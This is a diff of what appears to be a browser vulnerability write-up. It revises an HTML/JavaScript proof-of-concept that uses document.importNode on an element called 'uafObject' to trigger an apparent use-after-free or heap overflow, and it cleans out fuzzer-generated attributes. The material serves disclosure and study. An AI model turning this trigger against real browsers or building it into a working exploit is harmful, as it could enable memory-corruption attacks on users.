@@ -67,7 +67,7 @@ i have also found different code paths to the same issue that i have identified 
 
 ```javascript
 <script>
-function go() {
+function trigger() {
 
 // select the canvas object.
 var a = canvas;
@@ -85,14 +85,10 @@ var heapOverFlow = document.importNode(uafObject,true);
 }
 </script>
 </head>
-<body onload=go()>
-
-<title id="junk" style="-webkit-clip-path: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls">?Nz(CRd</title>
-
-<canvas id="canvas" name="[g1Wvvph^&amp;1S7I" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="B|rS8a5x](" onhashchange="eventhandler3()" ontransitionend="eventhandler4()" frame="BOX">
-
-<font id="uafObject" title="YD*2.(ccDWcq" size="4" tabindex="4" dir="auto" title="W" usemap="#htmlvar00009" disposition="attachment" pluginspage="rzAt0o`,]w : #C@f?" preload="none" accept="image/*">7:v=Lgi=5:IM(s&amp;6:r</font>
-
+<body onload=trigger()>
+<title id="junk" style=" content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls"></title>
+<canvas id="canvas" name="[g1Wvvph^&amp;1S7I" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="" onhashchange="" ontransitionend="" frame="BOX">
+<font id="uafObject" title="" size="4" tabindex="4" dir="auto" title="W" usemap="" disposition="attachment" pluginspage="" preload="none" accept="image/*"></font>
 </canvas>
 </body>
 ```
